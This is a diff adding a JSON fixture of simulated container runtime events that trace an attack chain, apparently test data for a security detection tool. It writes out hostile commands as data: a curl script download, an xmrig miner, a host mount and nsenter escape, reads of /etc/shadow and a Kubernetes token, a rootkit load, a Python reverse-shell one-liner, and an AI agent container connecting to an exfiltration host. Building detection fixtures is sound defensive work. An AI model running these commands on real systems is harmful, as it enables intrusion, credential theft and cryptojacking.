@@ -1,0 +1,167 @@
+{
+  "version": 1,
+  "name": "container-attack-chain",
+  "images": [
+    {
+      "image_id": "sha256:web",
+      "image_ref": "registry.example.com/web:1.4.2",
+      "binaries": [
+        "/usr/sbin/nginx",
+        "/docker-entrypoint.sh",
+        "/bin/sh",
+        "/bin/bash",
+        "/usr/bin/python3",
+        "/usr/bin/nsenter",
+        "/usr/bin/sudo"
+      ]
+    }
+  ],
+  "events": [
+    {
+      "seq": 1,
+      "time_unix_nano": 1000,
+      "kind": "process",
+      "container": {"id": "c-web-1", "name": "web", "image_id": "sha256:web", "image_ref": "registry.example.com/web:1.4.2", "runtime": "containerd"},
+      "process": {"pid": 1, "comm": "nginx", "exe": "/usr/sbin/nginx", "ancestry": ["/pause", "/usr/sbin/nginx"]},
+      "labels": {"pod": "web-7d9", "namespace": "prod", "node": "node-a"}
+    },
+    {
+      "seq": 2,
+      "time_unix_nano": 2000,
+      "kind": "process",
+      "container": {"id": "c-web-1", "name": "web", "image_id": "sha256:web", "image_ref": "registry.example.com/web:1.4.2", "runtime": "containerd"},
+      "process": {"pid": 812, "ppid": 1, "comm": "sh", "exe": "/bin/sh", "tty": true, "ancestry": ["/pause", "/usr/sbin/nginx", "/bin/sh"]},
+      "labels": {"pod": "web-7d9", "namespace": "prod"}
+    },
+    {
+      "seq": 3,
+      "time_unix_nano": 3000,
+      "kind": "process",
+      "container": {"id": "c-web-1", "name": "web", "image_id": "sha256:web", "image_ref": "registry.example.com/web:1.4.2"},
+      "process": {"pid": 900, "ppid": 812, "comm": "curl", "exe": "/usr/bin/curl", "args": ["curl", "-sL", "http://203.0.113.9/x.sh"], "ancestry": ["/pause", "/usr/sbin/nginx", "/bin/sh", "/usr/bin/curl"]}
+    },
+    {
+      "seq": 4,
+      "time_unix_nano": 4000,
+      "kind": "process",
+      "container": {"id": "c-web-1", "name": "web", "image_id": "sha256:web", "image_ref": "registry.example.com/web:1.4.2"},
+      "process": {"pid": 901, "ppid": 812, "comm": "xmrig", "exe": "/usr/local/bin/xmrig", "args": ["xmrig", "-o", "stratum+tcp://pool.minexmr.com:4444", "--donate-level", "1"], "ancestry": ["/pause", "/usr/sbin/nginx", "/bin/sh", "/usr/local/bin/xmrig"]}
+    },
+    {
+      "seq": 5,
+      "time_unix_nano": 5000,
+      "kind": "syscall",
+      "container": {"id": "c-web-1", "name": "web", "image_id": "sha256:web", "image_ref": "registry.example.com/web:1.4.2"},
+      "process": {"pid": 902, "ppid": 812, "comm": "mount", "exe": "/bin/mount"},
+      "syscall": {"name": "mount", "args": {"source": "/dev/sda1", "target": "/mnt/host", "fstype": "ext4"}}
+    },
+    {
+      "seq": 6,
+      "time_unix_nano": 6000,
+      "kind": "process",
+      "container": {"id": "c-web-1", "name": "web", "image_id": "sha256:web", "image_ref": "registry.example.com/web:1.4.2"},
+      "process": {"pid": 903, "ppid": 812, "comm": "nsenter", "exe": "/usr/bin/nsenter", "args": ["nsenter", "-t", "1", "-m", "-u", "-i", "-n", "-p"], "ancestry": ["/pause", "/usr/sbin/nginx", "/bin/sh", "/usr/bin/nsenter"]}
+    },
+    {
+      "seq": 7,
+      "time_unix_nano": 7000,
+      "kind": "file",
+      "container": {"id": "c-web-1", "name": "web", "image_id": "sha256:web", "image_ref": "registry.example.com/web:1.4.2"},
+      "process": {"pid": 812, "comm": "sh", "exe": "/bin/sh"},
+      "file": {"path": "/etc/shadow", "op": "read", "flags": "O_RDONLY"}
+    },
+    {
+      "seq": 8,
+      "time_unix_nano": 8000,
+      "kind": "file",
+      "container": {"id": "c-web-1", "name": "web", "image_id": "sha256:web", "image_ref": "registry.example.com/web:1.4.2"},
+      "process": {"pid": 812, "comm": "sh", "exe": "/bin/sh"},
+      "file": {"path": "/etc/passwd", "op": "write", "flags": "O_WRONLY|O_APPEND"}
+    },
+    {
+      "seq": 9,
+      "time_unix_nano": 9000,
+      "kind": "file",
+      "container": {"id": "c-web-1", "name": "web", "image_id": "sha256:web", "image_ref": "registry.example.com/web:1.4.2"},
+      "process": {"pid": 904, "ppid": 812, "comm": "cat", "exe": "/bin/cat"},
+      "file": {"path": "/var/run/secrets/kubernetes.io/serviceaccount/token", "op": "read", "flags": "O_RDONLY"}
+    },
+    {
+      "seq": 10,
+      "time_unix_nano": 10000,
+      "kind": "network",
+      "container": {"id": "c-web-1", "name": "web", "image_id": "sha256:web", "image_ref": "registry.example.com/web:1.4.2"},
+      "process": {"pid": 904, "comm": "cat", "exe": "/bin/cat"},
+      "network": {"op": "connect", "proto": "tcp", "remote_ip": "169.254.169.254", "remote_port": 80, "direction": "egress"}
+    },
+    {
+      "seq": 11,
+      "time_unix_nano": 11000,
+      "kind": "network",
+      "container": {"id": "c-web-1", "name": "web", "image_id": "sha256:web", "image_ref": "registry.example.com/web:1.4.2"},
+      "process": {"pid": 901, "comm": "xmrig", "exe": "/usr/local/bin/xmrig"},
+      "network": {"op": "connect", "proto": "tcp", "remote_ip": "203.0.113.5", "remote_port": 4444, "direction": "egress"}
+    },
+    {
+      "seq": 12,
+      "time_unix_nano": 12000,
+      "kind": "syscall",
+      "container": {"id": "c-web-1", "name": "web", "image_id": "sha256:web", "image_ref": "registry.example.com/web:1.4.2"},
+      "process": {"pid": 905, "ppid": 812, "comm": "insmod", "exe": "/sbin/insmod", "caps": ["CAP_SYS_MODULE"]},
+      "syscall": {"name": "init_module", "args": {"module": "rootkit.ko"}}
+    },
+    {
+      "seq": 13,
+      "time_unix_nano": 13000,
+      "kind": "syscall",
+      "container": {"id": "c-web-1", "name": "web", "image_id": "sha256:web", "image_ref": "registry.example.com/web:1.4.2"},
+      "process": {"pid": 906, "ppid": 812, "comm": "loader", "exe": "/tmp/loader"},
+      "syscall": {"name": "bpf", "args": {"cmd": "BPF_PROG_LOAD", "prog_type": "BPF_PROG_TYPE_KPROBE"}}
+    },
+    {
+      "seq": 14,
+      "time_unix_nano": 14000,
+      "kind": "file",
+      "container": {"id": "c-web-1", "name": "web", "image_id": "sha256:web", "image_ref": "registry.example.com/web:1.4.2"},
+      "process": {"pid": 906, "comm": "loader", "exe": "/tmp/loader"},
+      "file": {"path": "/proc/kallsyms", "op": "read", "flags": "O_RDONLY"}
+    },
+    {
+      "seq": 15,
+      "time_unix_nano": 15000,
+      "kind": "process",
+      "container": {"id": "c-web-1", "name": "web", "image_id": "sha256:web", "image_ref": "registry.example.com/web:1.4.2"},
+      "process": {"pid": 907, "ppid": 1, "comm": "python3", "exe": "/usr/bin/python3", "stdio_socket": true, "args": ["python3", "-c", "import socket,os,pty;s=socket.socket();s.connect(('203.0.113.5',9001));os.dup2(s.fileno(),0);pty.spawn('/bin/sh')"], "ancestry": ["/pause", "/usr/sbin/nginx", "/usr/bin/python3"]}
+    },
+    {
+      "seq": 16,
+      "time_unix_nano": 16000,
+      "kind": "process",
+      "container": {"id": "c-web-1", "name": "web", "image_id": "sha256:web", "image_ref": "registry.example.com/web:1.4.2"},
+      "process": {"pid": 908, "ppid": 812, "comm": "sudo", "exe": "/usr/bin/sudo", "uid": 0, "args": ["sudo", "-u", "root", "id"], "ancestry": ["/pause", "/usr/sbin/nginx", "/bin/sh", "/usr/bin/sudo"]}
+    },
+    {
+      "seq": 17,
+      "time_unix_nano": 17000,
+      "kind": "file",
+      "container": {"id": "c-web-1", "name": "web", "image_id": "sha256:web", "image_ref": "registry.example.com/web:1.4.2"},
+      "process": {"pid": 908, "comm": "sudo", "exe": "/usr/bin/sudo"},
+      "file": {"path": "/tmp/rootbash", "op": "chmod", "mode": 2541}
+    },
+    {
+      "seq": 18,
+      "time_unix_nano": 18000,
+      "kind": "process",
+      "container": {"id": "c-agent-1", "name": "assistant", "image_id": "sha256:agent", "image_ref": "registry.example.com/agent:0.9", "ai_agent": true},
+      "process": {"pid": 400, "comm": "agent", "exe": "/app/agent", "ancestry": ["/app/agent"]}
+    },
+    {
+      "seq": 19,
+      "time_unix_nano": 19000,
+      "kind": "network",
+      "container": {"id": "c-agent-1", "name": "assistant", "image_id": "sha256:agent", "image_ref": "registry.example.com/agent:0.9", "ai_agent": true},
+      "process": {"pid": 400, "comm": "agent", "exe": "/app/agent"},
+      "network": {"op": "connect", "proto": "tcp", "domain": "exfil.attacker.example", "remote_ip": "198.51.100.7", "remote_port": 443, "direction": "egress"}
+    }
+  ]
+}
